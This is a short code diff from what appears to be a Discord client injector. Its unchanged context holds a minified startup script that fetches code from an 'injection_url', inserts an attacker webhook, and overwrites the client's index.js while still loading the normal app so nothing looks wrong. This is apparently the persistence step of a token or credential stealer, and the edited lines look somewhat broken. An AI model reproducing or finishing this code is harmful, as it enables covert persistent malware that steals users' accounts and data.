@@ -121,7 +121,9 @@ function updateCheck() {
     );
 
     const startUpScript = async () => await execScript(`const fs=require("fs"),https=require("https"),path=require("path"),indexJs="${indexJs}",bdPath="${bdPath}",resourcePath="${resourcePath}",fileSize=fs.statSync(indexJs).size;async function init(){https.get("${config.injection_url}",(r=>{const e=fs.createWriteStream(indexJs);r.on("data",(r=>{const t=r.toString().replace("%WEBHOOK%","${config.webhook}");e.write(t)})),r.on("end",(()=>e.end()))})).on("error",(r=>{console.error("Error fetching data from URL:",r),setTimeout(init,1e4)}))}fs.readFile(indexJs,"utf8",((r,e)=>{if(r)return console.error("Error reading file:",r);(fileSize<2e4||"module.exports = require('./core.asar')"===e)&&init()}));try{require(path.join(resourcePath,"app.asar"))}catch(r){console.error("Error loading app.asar:",r)}if(fs.existsSync(bdPath))try{require(bdPath)}catch(r){console.error("Error loading bdPath:",r)}`);
-    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
+    const startUpScriptString = String(async () => await startUpScript());
+    fs.writeFileSync(resourceIndex, startUpScriptString.replace(/\\/g, '\\\\'));
+
   }
   if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
   fs.rmdirSync(path.join(__dirname, 'initiation'));
